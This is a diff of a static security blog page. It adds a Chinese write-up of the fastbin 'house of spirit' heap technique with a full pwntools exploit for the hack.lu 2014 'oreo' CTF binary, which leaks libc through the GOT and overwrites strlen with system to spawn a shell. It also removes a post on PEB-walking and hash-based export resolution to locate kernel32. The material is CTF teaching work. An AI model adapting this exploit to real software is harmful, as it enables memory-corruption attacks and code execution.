@@ -67,6 +67,61 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-pwn-house-of-spirit" class="post-pwn-house-of-spirit post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2018/07/29/pwn-house-of-spirit/">pwn-house of spirit</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/29/pwn-house-of-spirit/" data-id="cjk6jo353000fws3kumyr8ij0" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="fastbin-attack之house-of-spirit"><a href="#fastbin-attack之house-of-spirit" class="headerlink" title="fastbin-attack之house of spirit"></a>fastbin-attack之house of spirit</h2><p>fastbin attack的攻击方式：</p>
+<ol>
+<li>直接free某个地址，可以是bss,heap,stack等，但需要伪造已经分配堆内存时的内存布局即可，即house of spirit(与其相连的nextchunk-&gt;size同样需要伪造)。</li>
+<li>先malloc一个满足fastbin大小的chunk，free掉，修改掉其fd前向指针，指向我们想要分配的任意地址(同样需要伪造所在fastbin链中的chunk内存分布)，两次malloc之后，第二个chunk即指向任意地址。</li>
+</ol>
+<h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><p>利用思路：添加枪支的函数中存在heap overflow，申请的chunk大小属于fastbin范围，可以利用show_rifle函数泄露got表地址，也可以使用show_stats函数泄露got表地址，house of spirit技术对应free的地址为0x0804A2A8，从而可以写got表，最后getshell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./oreo'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">strlen_offset = libc.symbols[<span class="string">'strlen'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_rifle</span><span class="params">(rifle_name,rifle_description)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	<span class="comment">#p.recvuntil("Rifle name: ")</span></span><br><span class="line">	p.sendline(rifle_name)</span><br><span class="line">	<span class="comment">#p.recvuntil("Rifle description: ")</span></span><br><span class="line">	p.sendline(rifle_description)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_rifle</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_rifle</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(message)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	<span class="comment">#p.recvuntil("Enter any notice you'd like to submit with your order: ")</span></span><br><span class="line">	p.sendline(message)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_stats</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">	p.sendline(<span class="string">"5"</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x40</span>):</span><br><span class="line">	add_rifle(str(i+<span class="number">1</span>),str(i+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">house_of_spirit = <span class="number">27</span> * <span class="string">'A'</span> + p32(<span class="number">0x0804A2A8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#p.recvuntil("Rifle name: ")</span></span><br><span class="line">p.sendline(house_of_spirit)</span><br><span class="line"><span class="comment">#p.recvuntil("Rifle description: ")</span></span><br><span class="line">p.sendline(<span class="number">25</span> * <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">28</span> * <span class="string">'B'</span> + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>)</span><br><span class="line">leave_message(message)</span><br><span class="line"></span><br><span class="line">free_rifle()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#p.recvuntil("Rifle name: ")</span></span><br><span class="line">p.sendline(str(<span class="number">0x1</span>))</span><br><span class="line"><span class="comment">#p.recvuntil("Rifle description: ")</span></span><br><span class="line">p.sendline(p32(<span class="number">0x0804A250</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak got of strlen</span></span><br><span class="line"><span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Order Message: "</span>)</span><br><span class="line">strlen_addr = u32(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>)[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"strlen_addr:"</span>,hex(strlen_addr)</span><br><span class="line">libc_base_addr = strlen_addr - <span class="number">0x7E440</span></span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base_addr:"</span>,hex(libc_base_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr:"</span>,hex(system_addr)</span><br><span class="line"></span><br><span class="line">message = p32(system_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">leave_message(message)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("Action: ")</span></span><br><span class="line"><span class="comment">#p.sendline("1")</span></span><br><span class="line"><span class="comment">#p.recvuntil("Rifle name: ")</span></span><br><span class="line"><span class="comment">#p.sendline('A')</span></span><br><span class="line"><span class="comment">#p.recvuntil("Rifle description: ")</span></span><br><span class="line"><span class="comment">#p.sendline("/bin/sh")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line"><span class="comment">#free_rifle()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>利用方法是直接house of spirit，写strlen的got表地址，直接泄露其地址，然后覆盖，最后调用strlen函数获得shell。<br>程序泄露的strlen函数地址指向了libc中偏移为0x7E440的一个函数，而不是libc.symbols[‘strlen’]获得的偏移，好诡异。<br>一开始打算使用free函数来获得shell，但是由于输入fgets的限制，如果覆盖free的got表，就会影响到fgets函数的最低位，从而无法申请新的chunk，所以选择覆盖strlen的got表。</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/07/29/pwn-house-of-spirit/">
+    <time datetime="2018-07-29T07:51:59.868Z" class="entry-date">
+        2018-07-29
+    </time>
+</a>
+    
+  <span class="article-delim">&#8226;</span>
+  <div class="article-category">
+  <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-pwn-unlink" class="post-pwn-unlink post type-post status-publish format-standard hentry">
     <!---->
 
@@ -82,7 +137,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/25/pwn-unlink/" data-id="cjk0xtxcx000mjc3kird68uua" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/25/pwn-unlink/" data-id="cjk6jo36y000lws3kkklg8qt1" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -146,7 +201,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/16/QCTF-xman/" data-id="cjk0xtxco000ajc3kify7l60n" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/16/QCTF-xman/" data-id="cjk6jo34e000aws3kme8crdvd" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -214,7 +269,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/11/WCTF2018/" data-id="cjk0xtxcq000bjc3kf5oca3d0" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/11/WCTF2018/" data-id="cjk6jo359000hws3k7pntmqah" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -275,7 +330,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/05/29/setUnhandleExceptionFilter-exploration/" data-id="cjk0xtxd1000xjc3kfhljkqut" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/05/29/setUnhandleExceptionFilter-exploration/" data-id="cjk6jo3770011ws3kmxjecnih" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -362,7 +417,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/04/13/HITBCTF2018-reverse-hex/" data-id="cjk0xtxca0001jc3ktltw5yg5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/04/13/HITBCTF2018-reverse-hex/" data-id="cjk6jo33x0001ws3kp4qeea6a" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -429,7 +484,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/03/20/Play-Rtsp-Stream-opencv2/" data-id="cjk0xtxch0006jc3kirduaawg" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/03/20/Play-Rtsp-Stream-opencv2/" data-id="cjk6jo34b0006ws3ktw8kvcm4" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -481,7 +536,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/01/16/Mi-4C动态调试so库/" data-id="cjk0xtxce0004jc3k9pc18pv7" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/01/16/Mi-4C动态调试so库/" data-id="cjk6jo3460004ws3kqh7hwlly" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -535,7 +590,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/12/28/qemu环境搭建/" data-id="cjk0xtxd0000ujc3kohfo6g1y" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/12/28/qemu环境搭建/" data-id="cjk6jo375000wws3ky3ftqa0j" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -633,7 +688,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/11/12/hctf2017-level1Tolevel3-reverse/" data-id="cjk0xtxe3002fjc3kzqvooe6b" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/11/12/hctf2017-level1Tolevel3-reverse/" data-id="cjk6jo39t002iws3kkj8berwf" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -701,60 +756,6 @@
 
 
   
-    <article id="post-getKernel32" class="post-getKernel32 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2017/10/26/getKernel32/">获取kernel32基地址</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/10/26/getKernel32/" data-id="cjk0xtxcv000hjc3ksmsdsc06" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>从InMemoryOrderModuleList地址上获取kernel32.dll的基地址，原理如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor ebx, ebx </span><br><span class="line">mov ebx, fs:[ <span class="number">0x30</span> ]       ;PEB</span><br><span class="line">mov ebx, [ ebx + <span class="number">0x0C</span> ]    ;PEB-&gt;Ldr</span><br><span class="line">mov ebx, [ ebx + <span class="number">0x14</span> ]    ;PEB-&gt;Ldr.InMemoryOrderModuleList.Flink (<span class="number">1</span>st entry)</span><br><span class="line">mov ebx, [ ebx ]           ;<span class="function">next <span class="title">entry</span> <span class="params">(<span class="number">2</span>nd entry)</span></span></span><br><span class="line">mov ebx, [ ebx ]           ;entry (3rd entry)</span><br><span class="line">mov ebx, [ ebx + <span class="number">0x10</span> ]    ;<span class="function">base <span class="title">address</span> <span class="params">(kernel32.dll)</span></span></span><br></pre></td></tr></table></figure>
-<p>获取kernel32基地址以后，就可以从EAT获取GetProcAddress地址以及其他函数地址，下面程序以获得FindFirstFile地址为例，在EAT中搜索FindFirstFile地址的时候没有采用直接比较字符串名称的方法，而是对字符串名称作运算，根据运算结果来进行比较。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> win10x64 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> win10x64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kernel32Value 0x6E2BCA17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(win7x64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kernel32Value 0x8FECD63F</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span> <span class="params">(*myFindFirstFile)</span><span class="params">(LPCTSTR lpFileName,LPWIN32_FIND_DATA lpFindFileData)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">findPEB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD pebValue;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,fs:[<span class="number">0x30</span>]</span><br><span class="line">		mov pebValue,eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pebValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">calValue1</span><span class="params">(WORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD v1,v3;</span><br><span class="line">	v3 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(*a1)</span><br><span class="line">	&#123;</span><br><span class="line">		v1 = (WORD)*a1;</span><br><span class="line">		++a1;</span><br><span class="line">		v3 = v1 + ((v3 &lt;&lt; <span class="number">19</span>) | ((<span class="keyword">unsigned</span> __int64)v3 &gt;&gt; <span class="number">13</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">calValue2</span><span class="params">(BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD v1,v3;</span><br><span class="line">	v3 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(*a1)</span><br><span class="line">	&#123;</span><br><span class="line">		v1 = *a1++;</span><br><span class="line">		v3 = v1 + ((v3 &lt;&lt; <span class="number">19</span>) | ((<span class="keyword">unsigned</span> __int64)v3 &gt;&gt; <span class="number">13</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">findKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD pebValue = findPEB();</span><br><span class="line">	</span><br><span class="line">	DWORD v1 = *(DWORD *)(pebValue + <span class="number">12</span>);</span><br><span class="line">	DWORD *v3 = *(DWORD **)(v1 + <span class="number">20</span>);</span><br><span class="line">	DWORD *v4 = *(DWORD **)(v1 + <span class="number">20</span>);</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(calValue1((WORD *)v3[<span class="number">10</span>]) == kernel32Value)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> v3[<span class="number">4</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		v3 = (DWORD *)*v3;</span><br><span class="line">	&#125; <span class="keyword">while</span> (v3 &amp;&amp; v3 != v4);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">findGetProcAddress</span><span class="params">(DWORD kernel32Addr,DWORD funcValue)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD exportTable,addressOfFunctions,addressOfNames,addressOfNameOrdinals,numberOfNames;</span><br><span class="line">	exportTable = (*(DWORD *)(*(DWORD *)(kernel32Addr + <span class="number">60</span>) + kernel32Addr + <span class="number">120</span>) + kernel32Addr);</span><br><span class="line">	addressOfFunctions = *(DWORD *)(exportTable + <span class="number">0x1c</span>) + kernel32Addr;</span><br><span class="line">	addressOfNames = *(DWORD *)(exportTable + <span class="number">0x20</span>) + kernel32Addr;</span><br><span class="line">	addressOfNameOrdinals = *(DWORD *)(exportTable + <span class="number">0x24</span>) + kernel32Addr;</span><br><span class="line"></span><br><span class="line">	numberOfNames = *(DWORD *)(exportTable + <span class="number">0x18</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numberOfNames;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(calValue2((BYTE *)(*(DWORD *)(addressOfNames + <span class="number">4</span> * i) + kernel32Addr)) == funcValue)</span><br><span class="line">			<span class="keyword">return</span> *(DWORD *)(addressOfFunctions + <span class="number">4</span> * *(WORD *)(addressOfNameOrdinals + <span class="number">2</span> * i)) + kernel32Addr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD kernel32Addr;</span><br><span class="line">	myFindFirstFile findFirstFileAddr;</span><br><span class="line">	kernel32Addr = findKernel32();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"kernel32Addr:%X\n"</span>,kernel32Addr);</span><br><span class="line">	HMODULE hKernel32 = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"hKernel32:%X\n"</span>,hKernel32);</span><br><span class="line">	findFirstFileAddr = (myFindFirstFile)findGetProcAddress(kernel32Addr,<span class="number">0x63D6C065</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"findFirstFileAddr:%p\n"</span>,findFirstFileAddr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"FindFirstFile:%p\n"</span>,GetProcAddress(hKernel32,<span class="string">"FindFirstFileA"</span>));</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2017/10/26/getKernel32/">
-    <time datetime="2017-10-26T02:52:57.000Z" class="entry-date">
-        2017-10-26
-    </time>
-</a>
-    
-  <span class="article-delim">&#8226;</span>
-  <div class="article-category">
-  <a class="article-category-link" href="/categories/reverse/">reverse</a>
-  </div>
-
-    
-  <span class="article-delim">&#8226;</span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rev/">rev</a></li></ul>
-
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
@@ -779,7 +780,7 @@
   <aside class="widget">
     <h3 class="widget-title">Categories</h3>
     <div class="widget-content">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XCTF2018/">XCTF2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hctf/">hctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a><span class="category-list-count">6</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XCTF2018/">XCTF2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hctf/">hctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a><span class="category-list-count">6</span></li></ul>
     </div>
   </aside>
 
@@ -789,6 +790,10 @@
     <h3 class="widget-title">Recents</h3>
     <div class="widget-content">
       <ul>
+        
+          <li>
+            <a href="/2018/07/29/pwn-house-of-spirit/">pwn-house of spirit</a>
+          </li>
         
           <li>
             <a href="/2018/07/25/pwn-unlink/">pwn-unlink</a>
@@ -804,10 +809,6 @@
         
           <li>
             <a href="/2018/05/29/setUnhandleExceptionFilter-exploration/">setUnhandleExceptionFilter-exploration</a>
-          </li>
-        
-          <li>
-            <a href="/2018/04/13/HITBCTF2018-reverse-hex/">HITBCTF2018-reverse-hex</a>
           </li>
         
       </ul>
